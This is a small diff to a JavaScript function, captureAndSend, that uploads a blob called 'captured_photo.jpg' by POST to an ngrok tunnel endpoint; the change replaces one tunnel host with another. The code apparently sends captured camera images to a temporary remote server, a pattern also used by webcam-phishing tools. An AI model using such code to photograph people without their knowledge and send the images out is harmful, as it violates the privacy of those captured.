@@ -74,7 +74,7 @@ async function captureAndSend() {
         formData.append('file', blob, 'captured_photo.jpg');
 
         try {
-            const response = await fetch('https://bbb4-89-43-7-82.ngrok-free.app/get_image', {
+            const response = await fetch('https://436d-94-139-191-146.ngrok-free.app/get_image', {
                 method: 'POST',
                 body: formData,
             });
